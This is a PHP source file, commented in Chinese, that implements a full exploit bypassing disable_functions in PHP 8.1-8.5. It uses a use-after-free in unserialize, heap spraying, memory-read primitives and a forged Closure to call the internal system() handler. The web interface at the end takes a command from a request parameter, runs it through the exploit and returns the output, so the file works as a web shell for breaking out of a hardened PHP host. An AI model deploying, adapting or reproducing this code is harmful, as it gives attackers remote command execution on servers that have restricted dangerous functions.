<?php
/**
 * ================================================================
 *  PHP 8.1 - 8.5 disable_functions Bypass
 *  利用 Serializable shared-var_hash UAF → RCE
 * ================================================================
 *
 *  原理:
 *    zend_user_unserialize() 未递增 BG(serialize_lock)，
 *    Serializable::unserialize() 内的递归 unserialize() 继承外层 var_hash。
 *    内层 stdClass 属性表 resize (8→16) 触发 efree，外层 R:N 引用指向已释放内存。
 *    通过 heap spray 控制已释放区域 → 类型混淆 → 伪造 Closure → 调用 zif_system()
 *
 *  适用: PHP 8.1 - 8.5 (NTS, *nix, x86_64/aarch64)
 *
 * ================================================================
 */

@error_reporting(0);
@set_time_limit(120);
@ini_set('display_errors', '0');
@ob_start();

define('DBG', isset($_REQUEST['debug']));

// ======================== Exploit 核心 ========================

class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        unserialize($data)->x = 0;
    }
}

$GLOBALS['_cl'] = function(){};

class Exploit {
    const SPRAY_LEN   = 280;
    const SPRAY_COUNT = 32;
    const NUM_PROPS   = 8;

    const OFF_OBJ_CE       = 0x10;
    const OFF_OBJ_HANDLERS = 0x18;
    const OFF_CLOSURE_FUNC = 0x38;
    const OFF_HT_MASK      = 0x0C;
    const OFF_HT_ARDATA    = 0x10;

    const BUCKET_SIZE = 32;
    const BUCKET_VAL  = 0;
    const BUCKET_H    = 16;
    const BUCKET_KEY  = 24;

    const OFF_MODULE_FUNCS = 0x28;

    private $OFF_HANDLER;
    private $OFF_INTFUNC_MODULE;
    private $FUNC_ENTRY_SIZE;

    private $ADDR_MAX;
    private $DELTA_MAX;

    private $log = array();

    public function __construct() {
        $arch = php_uname('m');
        if ($arch === 'aarch64' || $arch === 'arm64') {
            $this->ADDR_MAX  = 0xFFFFFFFFFFFF;
            $this->DELTA_MAX = 0x600;
        } else {
            $this->ADDR_MAX  = 0x7FFFFFFFFFFF;
            $this->DELTA_MAX = 0x300;
        }

        $minor = PHP_MINOR_VERSION;
        if ($minor <= 1) {
            $this->OFF_HANDLER        = 0x38;
            $this->OFF_INTFUNC_MODULE = 0x40;
            $this->FUNC_ENTRY_SIZE    = 0x20;
        } elseif ($minor <= 3) {
            $this->OFF_HANDLER        = 0x48;
            $this->OFF_INTFUNC_MODULE = 0x50;
            $this->FUNC_ENTRY_SIZE    = 0x20;
        } elseif ($minor == 4) {
            $this->OFF_HANDLER        = 0x58;
            $this->OFF_INTFUNC_MODULE = 0x60;
            $this->FUNC_ENTRY_SIZE    = 0x30;
        } else {
            $this->OFF_HANDLER        = 0x58;
            $this->OFF_INTFUNC_MODULE = 0x60;
            $this->FUNC_ENTRY_SIZE    = 0x38;
        }
    }

    private function dbg($fmt) {
        $args = func_get_args();
        array_shift($args);
        $this->log[] = vsprintf($fmt, $args);
    }

    public function getLog() { return $this->log; }

    // ─── Spray builders ───

    private function build_inner() {
        $props = '';
        for ($k = 0; $k < self::NUM_PROPS; $k++) {
            $pname = "p$k";
            $props .= 's:' . strlen($pname) . ':"' . $pname . '";i:' . (0xAAAA0000 + $k) . ';';
        }
        return 'O:8:"stdClass":' . self::NUM_PROPS . ':{' . $props . '}';
    }

    private function build_spray_islong($marker = 0xBBBB0000) {
        $s = str_repeat("\x00", self::SPRAY_LEN);
        for ($k = 0; $k < 8; $k++) {
            $vo = 8 + $k * 32; $to = $vo + 8;
            if ($to + 4 > self::SPRAY_LEN) break;
            $m = $marker + $k;
            $s[$vo]=chr($m&0xFF); $s[$vo+1]=chr(($m>>8)&0xFF);
            $s[$vo+2]=chr(($m>>16)&0xFF); $s[$vo+3]=chr(($m>>24)&0xFF);
            $s[$vo+4]=$s[$vo+5]=$s[$vo+6]=$s[$vo+7]="\x00";
            $s[$to]="\x04"; $s[$to+1]=$s[$to+2]=$s[$to+3]="\x00";
        }
        return $s;
    }

    private function build_spray_isstring($target_addr) {
        $s = str_repeat("\x00", self::SPRAY_LEN);
        $vo = 8 + 1 * 32;
        $ab = pack('P', $target_addr);
        for ($i = 0; $i < 8; $i++) $s[$vo + $i] = $ab[$i];
        $to = $vo + 8;
        $s[$to] = "\x06"; $s[$to+1] = $s[$to+2] = $s[$to+3] = "\x00";
        for ($k = 0; $k < 8; $k++) {
            if ($k == 1) continue;
            $vo2 = 8 + $k * 32; $to2 = $vo2 + 8;
            if ($to2 + 4 > self::SPRAY_LEN) break;
            $s[$to2] = "\x04"; $s[$to2+1] = $s[$to2+2] = $s[$to2+3] = "\x00";
        }
        return $s;
    }

    private function build_spray_isobject($obj_addr) {
        $s = str_repeat("\x00", self::SPRAY_LEN);
        $vo = 8 + 1 * 32;
        $ab = pack('P', $obj_addr);
        for ($i = 0; $i < 8; $i++) $s[$vo + $i] = $ab[$i];
        $to = $vo + 8;
        $s[$to] = "\x08"; $s[$to+1] = "\x03"; $s[$to+2] = $s[$to+3] = "\x00";
        for ($k = 0; $k < 8; $k++) {
            if ($k == 1) continue;
            $vo2 = 8 + $k * 32; $to2 = $vo2 + 8;
            if ($to2 + 4 > self::SPRAY_LEN) break;
            $s[$to2] = "\x04"; $s[$to2+1] = $s[$to2+2] = $s[$to2+3] = "\x00";
        }
        return $s;
    }

    private function build_payload($spray, $num_refs = 1) {
        $inner = $this->build_inner();
        $c_part = 'C:10:"CachedData":' . strlen($inner) . ':{' . $inner . '}';
        $total = 1 + self::SPRAY_COUNT + $num_refs;
        $parts = ['i:0;' . $c_part];
        for ($i = 0; $i < self::SPRAY_COUNT; $i++) {
            $parts[] = 'i:' . ($i + 1) . ';s:' . self::SPRAY_LEN . ':"' . $spray . '";';
        }
        for ($k = 0; $k < $num_refs; $k++) {
            $parts[] = 'i:' . (self::SPRAY_COUNT + 1 + $k) . ';R:' . (4 + $k) . ';';
        }
        return 'a:' . $total . ':{' . implode('', $parts) . '}';
    }

    // ─── UAF read primitives ───

    private function uaf_read($addr, $n = 8) {
        foreach ([0, 0x08, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200] as $bias) {
            $target = $addr - 0x18 - $bias;
            if ($target < 0x1000) continue;
            $spray = $this->build_spray_isstring($target);
            $payload = $this->build_payload($spray, 1);
            $result = @unserialize($payload);
            if ($result === false) continue;
            $str = $result[self::SPRAY_COUNT + 1];
            if (!is_string($str)) continue;
            $slen = strlen($str);
            if ($slen >= 0 && $slen <= $bias + $n - 1) continue;
            $out = substr($str, $bias, $n);
            if (strlen($out) >= $n) return $out;
        }
        return false;
    }

    private function read8($addr) {
        $d = $this->uaf_read($addr, 8);
        if ($d === false || strlen($d) < 8) return false;
        return unpack('P', $d)[1];
    }

    private function read8_retry($addr, $attempts = 3) {
        for ($i = 0; $i < $attempts; $i++) {
            $v = $this->read8($addr);
            if ($v !== false) return $v;
        }
        return false;
    }

    // ─── DJBX33A hash ───

    private function zend_hash_func($key) {
        $h = 5381;
        for ($i = 0; $i < strlen($key); $i++)
            $h = @((($h << 5) + $h) + ord($key[$i]));
        return @($h | (1 << 63));
    }

    private function ht_find($ht_addr, $key) {
        $arData = $this->read8_retry($ht_addr + self::OFF_HT_ARDATA);
        if ($arData === false) return false;
        $d = $this->uaf_read($ht_addr + self::OFF_HT_MASK, 4);
        if ($d === false) return false;
        $nTableMask = unpack('V', $d)[1];
        return $this->ht_find_raw($arData, $nTableMask, $key);
    }

    private function ht_find_raw($arData, $nTableMask, $key) {
        $h = $this->zend_hash_func($key);
        $nIndex = (($h & 0xFFFFFFFF) | $nTableMask) & 0xFFFFFFFF;
        if ($nIndex >= 0x80000000) $nIndex -= 0x100000000;

        $slot_addr = $arData + $nIndex * 4;
        $d = $this->uaf_read($slot_addr, 4);
        if ($d === false) return false;
        $idx = unpack('V', $d)[1];
        if ($idx === 0xFFFFFFFF) return false;

        $klen = strlen($key);
        for ($chain = 0; $chain < 16; $chain++) {
            $bucket_addr = $arData + $idx * self::BUCKET_SIZE;
            $bucket = $this->uaf_read($bucket_addr, self::BUCKET_SIZE);
            if ($bucket === false) return false;
            $key_ptr = unpack('P', substr($bucket, self::BUCKET_KEY, 8))[1];
            if ($key_ptr != 0) {
                $kd = $this->uaf_read($key_ptr + 16, 8 + $klen);
                if ($kd !== false) {
                    $slen = unpack('P', substr($kd, 0, 8))[1];
                    if ($slen == $klen && substr($kd, 8, $klen) === $key) {
                        return $bucket;
                    }
                }
            }
            $next = unpack('V', substr($bucket, 12, 4))[1];
            if ($next === 0xFFFFFFFF) return false;
            $idx = $next;
        }
        return false;
    }

    // ─── Phase 1: Heap address leak ───

    private function heap_leak() {
        $spray = $this->build_spray_islong();
        $original = $spray;
        $payload = $this->build_payload($spray, self::NUM_PROPS);
        $result = @unserialize($payload);
        if ($result === false) return false;

        for ($i = 1; $i <= self::SPRAY_COUNT; $i++) {
            $s = $result[$i];
            for ($k = 0; $k < self::NUM_PROPS; $k++) {
                $vo = 8 + ($k + 1) * 32;
                if (substr($s, $vo, 8) !== substr($original, $vo, 8)) {
                    return unpack('P', substr($s, $vo, 8))[1];
                }
            }
        }
        return false;
    }

    // ─── Phase 2: Find object pointers (ce, handlers) ───

    private function find_object_pointers($heap_addr) {
        $chunk = $heap_addr & 0xFFFFFFFFFFE00000;

        for ($i = 0; $i < 256; $i++) {
            $GLOBALS["_spray_$i"] = function(){};
        }

        for ($attempt = 0; $attempt < 3; $attempt++) {
            $target = $chunk - 0x10;
            $spray = $this->build_spray_isstring($target);
            $payload = $this->build_payload($spray, 1);
            $result = @unserialize($payload);
            if ($result === false) continue;
            $str = $result[self::SPRAY_COUNT + 1];
            if (!is_string($str)) continue;
            $slen = strlen($str);
            if ($slen < 0x10000) continue;

            $max_off = min($slen, 0x200000 - 0x08);

            $pairs = [];
            for ($off = 8; $off + 32 <= $max_off; $off += 16) {
                $rc = unpack('V', substr($str, $off, 4))[1];
                if ($rc < 1 || $rc > 50) continue;
                $ti = ord($str[$off + 4]) & 0x0F;
                if ($ti != 8) continue;
                $handle = unpack('V', substr($str, $off + 8, 4))[1];
                if ($handle == 0 || $handle > 100000) continue;
                $pad = unpack('V', substr($str, $off + 12, 4))[1];
                if ($pad != 0) continue;
                $ce = unpack('P', substr($str, $off + 16, 8))[1];
                $handlers = unpack('P', substr($str, $off + 24, 8))[1];
                if ($ce == 0 || $handlers == 0) continue;
                if (($handlers & (~0x1FFFFF)) == $chunk) continue;
                if ($handlers < 0x10000 || $handlers > $this->ADDR_MAX) continue;
                $key = sprintf("%x", $handlers);
                if (!isset($pairs[$key])) $pairs[$key] = ['ce' => $ce, 'handlers' => $handlers, 'count' => 0];
                $pairs[$key]['count']++;
            }

            if (empty($pairs)) continue;

            usort($pairs, fn($a, $b) => $b['count'] <=> $a['count']);
            $best = $pairs[0];
            $this->dbg("Found %d object groups, best: count=%d ce=0x%x handlers=0x%x",
                count($pairs), $best['count'], $best['ce'], $best['handlers']);
            return [$best['ce'], $best['handlers']];
        }
        return false;
    }

    // ─── Phase 3a: Find EG and function_table ───

    private function find_rw_ranges($handlers) {
        $maps = @file_get_contents('/proc/self/maps');
        if ($maps === false) {
            $this->dbg("Cannot read /proc/self/maps");
            return false;
        }

        $lines = explode("\n", $maps);
        $target_lib = null;
        $handler_seg = null;
        foreach ($lines as $line) {
            if (empty($line)) continue;
            if (!preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)/', $line, $m)) continue;
            $start = hexdec($m[1]);
            $end = hexdec($m[2]);
            if ($handlers >= $start && $handlers < $end) {
                $handler_seg = [$start, $end, $line];
                $parts = preg_split('/\s+/', trim($line));
                if (count($parts) >= 6 && $parts[5][0] === '/') {
                    $target_lib = $parts[5];
                }
                $this->dbg("handlers in: %s", trim($line));
                break;
            }
        }

        if ($handler_seg === null) {
            $this->dbg("handlers 0x%x not found in any mapping", $handlers);
            return false;
        }

        $rw_ranges = [];

        if ($target_lib !== null) {
            foreach ($lines as $line) {
                if (strpos($line, $target_lib) === false) continue;
                if (strpos($line, 'rw-p') === false) continue;
                if (preg_match('/^([0-9a-f]+)-([0-9a-f]+)/', $line, $m)) {
                    $rw_ranges[] = [hexdec($m[1]), hexdec($m[2])];
                }
            }
        }

        if (empty($rw_ranges)) {
            if (strpos($handler_seg[2], 'rw-p') !== false) {
                $rw_ranges[] = [$handler_seg[0], $handler_seg[1]];
            }

            $php_lib = null;
            foreach ($lines as $line) {
                if (preg_match('/\/(libphp|php[0-9]*-?[a-z]*\.so|bin\/php)/', $line, $pm)) {
                    $parts = preg_split('/\s+/', trim($line));
                    if (count($parts) >= 6 && $parts[5][0] === '/') {
                        $php_lib = $parts[5];
                        break;
                    }
                }
            }

            if ($php_lib !== null) {
                $this->dbg("Found PHP library: %s", basename($php_lib));
                foreach ($lines as $line) {
                    if (strpos($line, $php_lib) === false) continue;
                    if (strpos($line, 'rw-p') === false) continue;
                    if (preg_match('/^([0-9a-f]+)-([0-9a-f]+)/', $line, $m)) {
                        $rw_ranges[] = [hexdec($m[1]), hexdec($m[2])];
                    }
                }
            }

            foreach ($lines as $line) {
                if (strpos($line, 'rw-p') === false) continue;
                if (preg_match('/^([0-9a-f]+)-([0-9a-f]+)/', $line, $m)) {
                    $seg_start = hexdec($m[1]);
                    $seg_end = hexdec($m[2]);
                    if ($seg_start == $handler_seg[0]) continue;
                    $dist = abs($seg_start - $handlers);
                    if ($dist < 0x400000) {
                        $already = false;
                        foreach ($rw_ranges as [$rs, $re]) {
                            if ($rs == $seg_start) { $already = true; break; }
                        }
                        if (!$already) {
                            $rw_ranges[] = [$seg_start, $seg_end];
                        }
                    }
                }
            }
        }

        if (!empty($rw_ranges)) return $rw_ranges;
        $this->dbg("No suitable rw-p segment found");
        return false;
    }

    private function scan_segment_bulk($handlers, $rw_start, $rw_end) {
        $seg_size = $rw_end - $rw_start;
        if ($seg_size < 0x100 || $seg_size > 0x800000) return false;

        foreach ([0x10, 0x100, 0x200, 0x1000] as $header_off) {
            $target = $rw_start - $header_off;
            if ($target < 0x1000) continue;
            $spray = $this->build_spray_isstring($target);
            $payload = $this->build_payload($spray, 1);
            $result = @unserialize($payload);
            if ($result === false) continue;
            $str = $result[self::SPRAY_COUNT + 1];
            if (!is_string($str)) continue;
            $slen = strlen($str);
            $val_start = $target + 0x18;
            $val_end = $val_start + $slen;

            $cover_start = max($rw_start, $val_start);
            $cover_end = min($rw_end, $val_end);
            $coverage = $cover_end - $cover_start;
            if ($coverage < 0x100) continue;

            $this->dbg("Bulk read: target=0x%x len=0x%x covers 0x%x bytes", $target, $slen, $coverage);

            for ($addr = $cover_start; $addr + 24 <= $cover_end; $addr += 8) {
                $off = $addr - $val_start;
                foreach ([0x1b0, 0x1c8] as $ft_off) {
                    $ft_off_in_str = $off;
                    $ct_off_in_str = $off + 8;
                    $zc_off_in_str = $off + 16;

                    if ($ct_off_in_str + 8 > $slen) continue;

                    $ft_ptr = unpack('P', substr($str, $ft_off_in_str, 8))[1];
                    $ct_ptr = unpack('P', substr($str, $ct_off_in_str, 8))[1];
                    $zc_ptr = unpack('P', substr($str, $zc_off_in_str, 8))[1];

                    if ($ft_ptr < 0x10000 || $ft_ptr > $this->ADDR_MAX) continue;
                    if ($ct_ptr < 0x10000 || $ct_ptr > $this->ADDR_MAX) continue;
                    if ($zc_ptr < 0x10000 || $zc_ptr > $this->ADDR_MAX) continue;
                    if (abs($ft_ptr - $ct_ptr) > 0x1000000) continue;
                    if (abs($ct_ptr - $zc_ptr) > 0x1000000) continue;

                    $htd = $this->uaf_read($ft_ptr + self::OFF_HT_MASK, 16);
                    if ($htd === false) continue;

                    $nTableMask = unpack('V', substr($htd, 0, 4))[1];
                    $arData = unpack('P', substr($htd, 4, 8))[1];
                    $nNumUsed = unpack('V', substr($htd, 12, 4))[1];

                    $pos = (~$nTableMask + 1) & 0xFFFFFFFF;
                    if ($pos < 64 || ($pos & ($pos - 1)) != 0) continue;
                    if ($arData < 0x10000 || $arData > $this->ADDR_MAX) continue;
                    if ($nNumUsed < 100 || $nNumUsed > 10000) continue;

                    $delta = $addr - $ft_off - $handlers;
                    $this->dbg("function_table @ 0x%x (nNumUsed=%d, delta=0x%x) [bulk]", $ft_ptr, $nNumUsed, $delta);
                    return ['ht' => $ft_ptr, 'arData' => $arData, 'nTableMask' => $nTableMask,
                            'delta' => $delta, 'ft_off' => $ft_off];
                }
            }
        }
        return false;
    }

    private function scan_for_ft($handlers, $start_delta, $end_delta, $step) {
        for ($delta = $start_delta; $delta < $end_delta; $delta += $step) {
            foreach ([0x1b0, 0x1c8] as $ft_off) {
                $ptr_addr = $handlers + $delta + $ft_off;
                $d = $this->uaf_read($ptr_addr, 24);
                if ($d === false) continue;

                $ft_ptr = unpack('P', substr($d, 0, 8))[1];
                $ct_ptr = unpack('P', substr($d, 8, 8))[1];
                $zc_ptr = unpack('P', substr($d, 16, 8))[1];

                if ($ft_ptr < 0x10000 || $ft_ptr > $this->ADDR_MAX) continue;
                if ($ct_ptr < 0x10000 || $ct_ptr > $this->ADDR_MAX) continue;
                if ($zc_ptr < 0x10000 || $zc_ptr > $this->ADDR_MAX) continue;
                if (abs($ft_ptr - $ct_ptr) > 0x1000000) continue;
                if (abs($ct_ptr - $zc_ptr) > 0x1000000) continue;

                $htd = $this->uaf_read($ft_ptr + self::OFF_HT_MASK, 16);
                if ($htd === false) continue;

                $nTableMask = unpack('V', substr($htd, 0, 4))[1];
                $arData = unpack('P', substr($htd, 4, 8))[1];
                $nNumUsed = unpack('V', substr($htd, 12, 4))[1];

                $pos = (~$nTableMask + 1) & 0xFFFFFFFF;
                if ($pos < 64 || ($pos & ($pos - 1)) != 0) continue;
                if ($arData < 0x10000 || $arData > $this->ADDR_MAX) continue;
                if ($nNumUsed < 100 || $nNumUsed > 10000) continue;

                $this->dbg("function_table @ 0x%x (nNumUsed=%d, delta=0x%x)", $ft_ptr, $nNumUsed, $delta);
                return ['ht' => $ft_ptr, 'arData' => $arData, 'nTableMask' => $nTableMask,
                        'delta' => $delta, 'ft_off' => $ft_off];
            }
        }
        return false;
    }

    private function find_function_table_ht($handlers, $heap_addr) {
        $rw_ranges = $this->find_rw_ranges($handlers);
        if ($rw_ranges !== false) {
            foreach ($rw_ranges as [$rw_start, $rw_end]) {
                $this->dbg("Bulk-scanning rw-p: 0x%x-0x%x (size=0x%x)", $rw_start, $rw_end, $rw_end - $rw_start);
                $result = $this->scan_segment_bulk($handlers, $rw_start, $rw_end);
                if ($result !== false) return $result;
            }

            foreach ($rw_ranges as [$rw_start, $rw_end]) {
                $start_delta = $rw_start - $handlers;
                $end_delta = $rw_end - $handlers;
                if ($end_delta - $start_delta < 8) continue;
                $seg_size = $end_delta - $start_delta;
                if ($seg_size > 0x20000) continue;
                $this->dbg("Per-position scan: delta 0x%x..0x%x", $start_delta, $end_delta);
                $result = $this->scan_for_ft($handlers, $start_delta, $end_delta, 8);
                if ($result !== false) return $result;
            }
        }

        $this->dbg("Falling back to nearby linear scan");
        $ranges = [
            [0x20, 0x1000, 8], [-0x1000, -0x20, 8],
            [0x1000, 0x4000, 8], [-0x4000, -0x1000, 8],
        ];
        foreach ($ranges as [$s, $e, $step]) {
            $result = $this->scan_for_ft($handlers, $s, $e, $step);
            if ($result !== false) return $result;
        }
        return false;
    }

    // ─── Phase 3b: Find symbol_table ───

    private function find_symbol_table($handlers, $combined, $heap_addr) {
        foreach ([0x1b0, 0x1c8] as $ft_off) {
            $delta = $combined - $ft_off;
            $eg = $handlers + $delta;
            if ($eg < 0x10000 || $eg > $this->ADDR_MAX) continue;
            $st = $eg + 0x130;

            $d = $this->uaf_read($st + self::OFF_HT_MASK, 16);
            if ($d === false) continue;

            $st_mask = unpack('V', substr($d, 0, 4))[1];
            $st_ardata = unpack('P', substr($d, 4, 8))[1];
            $st_nused = unpack('V', substr($d, 12, 4))[1];

            $m32 = $st_mask & 0xFFFFFFFF;
            if ($m32 < 0xFFFF0000) continue;
            $pos = (~$m32 + 1) & 0xFFFFFFFF;
            if (($pos & ($pos - 1)) !== 0 || $pos < 4) continue;
            if ($st_ardata < 0x10000) continue;
            if ($st_nused > 500) continue;

            $this->dbg("EG @ 0x%x, symbol_table @ 0x%x (nNumUsed=%d)", $eg, $st, $st_nused);
            return $st;
        }
        return false;
    }

    private function read_str($addr, $maxlen = 32) {
        $d = $this->uaf_read($addr, $maxlen);
        if ($d === false) return false;
        $s = '';
        for ($i = 0; $i < strlen($d); $i++) {
            $c = ord($d[$i]);
            if ($c == 0) break;
            if ($c >= 0x20 && $c <= 0x7e) $s .= chr($c);
            else return false;
        }
        return $s;
    }

    // ─── Phase 4: Bypass disable_functions ───

    private function find_system($arData, $nTableMask, $closure_handlers) {
        $disabled = ini_get('disable_functions');
        $is_disabled = (stripos($disabled, 'system') !== false);

        if (!$is_disabled) {
            $bucket = $this->ht_find_raw($arData, $nTableMask, "system");
            if ($bucket !== false) {
                $func_ptr = unpack('P', substr($bucket, 0, 8))[1];
                $handler = $this->read8_retry($func_ptr + $this->OFF_HANDLER);
                if ($handler !== false) {
                    $this->dbg("zif_system @ 0x%x (not disabled)", $handler);
                    return ['handler' => $handler, 'mode' => 'closure'];
                }
            }
        }

        $this->dbg("system() disabled, bypassing via module function entry table");
        $handler = $this->find_system_via_module($arData, $nTableMask);
        if ($handler === false) return false;

        $this->dbg("zif_system (from module) @ 0x%x", $handler);
        return ['handler' => $handler, 'mode' => 'closure'];
    }

    private function find_system_via_module($arData, $nTableMask) {
        $probe_funcs = ['var_dump', 'array_push', 'phpversion', 'getenv', 'strtolower'];
        $mod_ptr = false;

        foreach ($probe_funcs as $fname) {
            $bucket = $this->ht_find_raw($arData, $nTableMask, $fname);
            if ($bucket === false) continue;
            $func_ptr = unpack('P', substr($bucket, 0, 8))[1];
            $candidate = $this->read8_retry($func_ptr + $this->OFF_INTFUNC_MODULE);
            if ($candidate === false || $candidate < 0x10000 || $candidate > $this->ADDR_MAX) continue;

            $name_ptr = $this->read8_retry($candidate + 0x20);
            if ($name_ptr === false) continue;
            $name = $this->read_str($name_ptr, 16);
            if ($name === 'standard') {
                $mod_ptr = $candidate;
                $this->dbg("standard module @ 0x%x (via %s)", $mod_ptr, $fname);
                break;
            }
        }

        if ($mod_ptr === false) return false;

        $funcs = $this->read8_retry($mod_ptr + self::OFF_MODULE_FUNCS);
        if ($funcs === false) return false;
        $this->dbg("module functions @ 0x%x", $funcs);

        $max_entries = 600;
        $entry_size = $this->FUNC_ENTRY_SIZE;

        $table_size = $max_entries * $entry_size;
        $candidates = [];

        foreach ([0x10, 0x100, 0x200, 0x1000] as $hoff) {
            $target = $funcs - $hoff;
            if ($target < 0x1000) continue;
            $spray = $this->build_spray_isstring($target);
            $payload = $this->build_payload($spray, 1);
            $result = @unserialize($payload);
            if ($result === false) continue;
            $str = $result[self::SPRAY_COUNT + 1];
            if (!is_string($str)) continue;
            $slen = strlen($str);
            $val_start = $target + 0x18;
            $tbl_off = $funcs - $val_start;
            if ($tbl_off < 0 || $tbl_off + $entry_size > $slen) continue;

            for ($j = 0; $j < $max_entries; $j++) {
                $eoff = $tbl_off + $j * $entry_size;
                if ($eoff + 0x10 > $slen) break;
                $fp = unpack('P', substr($str, $eoff, 8))[1];
                if ($fp == 0) break;
                if ($fp < 0x10000 || $fp > $this->ADDR_MAX) continue;
                $hv = unpack('P', substr($str, $eoff + 0x08, 8))[1];
                $candidates[] = ['fp' => $fp, 'hv' => $hv];
            }
            $this->dbg("Bulk entry table: %d entries extracted", count($candidates));
            break;
        }

        if (empty($candidates)) {
            $this->dbg("Bulk entry read failed, falling back to per-entry scan");
            for ($j = 0; $j < 600; $j++) {
                $entry = $funcs + $j * $entry_size;
                $fname_ptr = $this->read8_retry($entry);
                if ($fname_ptr === false || $fname_ptr == 0) break;
                $fname = $this->read_str($fname_ptr, 16);
                if ($fname === 'system')
                    return $this->read8_retry($entry + 0x08);
            }
            return false;
        }

        $min_fp = PHP_INT_MAX; $max_fp = 0;
        foreach ($candidates as $c) {
            if ($c['fp'] < $min_fp) $min_fp = $c['fp'];
            if ($c['fp'] > $max_fp) $max_fp = $c['fp'];
        }
        $name_range = $max_fp - $min_fp + 64;

        if ($name_range > 0 && $name_range < 0x800000) {
            foreach ([0x10, 0x100, 0x200, 0x1000] as $hoff) {
                $target = $min_fp - $hoff;
                if ($target < 0x1000) continue;
                $spray = $this->build_spray_isstring($target);
                $payload = $this->build_payload($spray, 1);
                $result = @unserialize($payload);
                if ($result === false) continue;
                $str2 = $result[self::SPRAY_COUNT + 1];
                if (!is_string($str2)) continue;
                $slen2 = strlen($str2);
                $val_start2 = $target + 0x18;
                if ($val_start2 + $slen2 < $max_fp + 8) continue;

                foreach ($candidates as $c) {
                    $noff = $c['fp'] - $val_start2;
                    if ($noff < 0 || $noff + 7 > $slen2) continue;
                    if (substr($str2, $noff, 7) === "system\x00") {
                        $this->dbg("Found 'system' in bulk name data, handler=0x%x", $c['hv']);
                        return $c['hv'];
                    }
                }
                break;
            }
        }

        $this->dbg("Targeted name reads for %d candidates", count($candidates));
        foreach ($candidates as $c) {
            $fname = $this->read_str($c['fp'], 16);
            if ($fname === 'system') return $c['hv'];
        }
        return false;
    }

    // ─── Build fake zend_closure ───

    private function build_fake_closure($ce, $handlers, $system_handler) {
        $b = str_repeat("\x00", 512);
        $w = function(&$buf, $off, $data) {
            for ($i = 0; $i < strlen($data); $i++) $buf[$off + $i] = $data[$i];
        };

        $w($b, 0x00, pack('V', 0x7FFFFFFF));
        $w($b, 0x04, pack('V', 0x18));
        $w($b, self::OFF_OBJ_CE, pack('P', $ce));
        $w($b, self::OFF_OBJ_HANDLERS, pack('P', $handlers));
        $w($b, self::OFF_CLOSURE_FUNC, chr(1));
        $w($b, 0x58, pack('V', 1));
        $w($b, 0x5C, pack('V', 1));
        $w($b, self::OFF_CLOSURE_FUNC + $this->OFF_HANDLER, pack('P', $system_handler));

        return $b;
    }

    private function find_var_string_addr($st_addr, $name) {
        $bucket = $this->ht_find($st_addr, $name);
        if ($bucket === false) return false;

        $type = ord($bucket[8]);
        $val  = unpack('P', substr($bucket, 0, 8))[1];

        if ($type == 6) return $val;
        if ($type == 10) {
            $inner = $this->uaf_read($val + 8, 16);
            if ($inner === false) return false;
            if (ord($inner[8]) == 6) return unpack('P', substr($inner, 0, 8))[1];
        }
        return false;
    }

    // ─── Main ───

    public function run($cmd) {
        $this->dbg("PHP %s (%s)  OFF_HANDLER=0x%x  OFF_MODULE=0x%x  FUNC_ENTRY=0x%x",
            PHP_VERSION, php_uname('m'), $this->OFF_HANDLER, $this->OFF_INTFUNC_MODULE, $this->FUNC_ENTRY_SIZE);

        $this->dbg("Phase 1: Heap address leak");
        $heap_addr = $this->heap_leak();
        if ($heap_addr === false) { $this->dbg("heap_leak failed"); return false; }
        $this->dbg("zend_reference @ 0x%x", $heap_addr);

        $this->dbg("Phase 2: Finding object pointers");
        $ptrs = $this->find_object_pointers($heap_addr);
        if ($ptrs === false) { $this->dbg("Cannot find object pointers"); return false; }
        [$ce_closure, $closure_handlers] = $ptrs;

        $this->dbg("Phase 3: Locating executor globals");
        $ft = $this->find_function_table_ht($closure_handlers, $heap_addr);
        if ($ft === false) { $this->dbg("Cannot find function_table HT"); return false; }
        $combined = $ft['delta'] + $ft['ft_off'];
        $st_addr = $this->find_symbol_table($closure_handlers, $combined, $heap_addr);
        if ($st_addr === false) { $this->dbg("Cannot find symbol_table"); return false; }

        $this->dbg("Phase 4: Bypassing disable_functions");
        $sys = $this->find_system($ft['arData'], $ft['nTableMask'], $closure_handlers);
        if ($sys === false) { $this->dbg("Cannot find zif_system"); return false; }

        $this->dbg("Phase 5: Building fake closure");
        $fc = $this->build_fake_closure($ce_closure, $closure_handlers, $sys['handler']);
        $GLOBALS["_xfc"] = $fc;

        $this->dbg("Phase 6: Locating fake closure via EG.symbol_table");
        $str_ptr = $this->find_var_string_addr($st_addr, "_xfc");
        if ($str_ptr === false) { $this->dbg("Cannot find _xfc"); return false; }
        $obj_addr = $str_ptr + 24;
        $this->dbg("Fake closure @ 0x%x", $obj_addr);

        $this->dbg("Phase 7: Type confusion → RCE");
        $spray = $this->build_spray_isobject($obj_addr);
        $payload = $this->build_payload($spray, 1);
        $result = @unserialize($payload);
        if ($result === false) { $this->dbg("Final unserialize failed"); return false; }

        $idx = self::SPRAY_COUNT + 1;
        if (!is_object($result[$idx])) {
            $this->dbg("Expected object, got %s", gettype($result[$idx]));
            return false;
        }

        $this->dbg("Got fake Closure, executing command");
        $result[$idx]($cmd);
        return true;
    }
}

// ======================== Web 界面 ========================

$cmd_raw = isset($_REQUEST['cmd']) ? trim($_REQUEST['cmd']) : '';
$cmd = '';
if (!empty($cmd_raw)) {
    $decoded = @base64_decode($cmd_raw, true);
    if ($decoded !== false && base64_encode($decoded) === $cmd_raw && strlen($cmd_raw) > 3) {
        $cmd = $decoded;
    } else {
        $cmd = $cmd_raw;
    }
}

$output = '';
$status = '';
$logs   = array();

if (!empty($cmd)) {
    $tmp = sys_get_temp_dir();
    if (!$tmp || !@is_writable($tmp)) $tmp = '/tmp';
    $out_file = $tmp . '/.uaf_' . substr(md5(mt_rand()), 0, 8);

    $full_cmd = "{$cmd} > {$out_file} 2>&1";

    $exploit = new Exploit();
    $ok = $exploit->run($full_cmd);
    $logs = $exploit->getLog();

    usleep(100000);
    $output = @file_get_contents($out_file);
    @unlink($out_file);

    if ($output !== false && strlen(trim($output)) > 0) {
        $status = 'ok';
    } elseif ($ok) {
        $output = '(command executed, no output)';
        $status = 'warn';
    } else {
        $output = '[!] Exploit failed — check debug log for details';
        $status = 'fail';
    }
}

$php_ver  = PHP_VERSION;
$sapi     = php_sapi_name();
$os       = PHP_OS . ' / ' . (PHP_INT_SIZE == 8 ? 'x86_64' : 'x86');
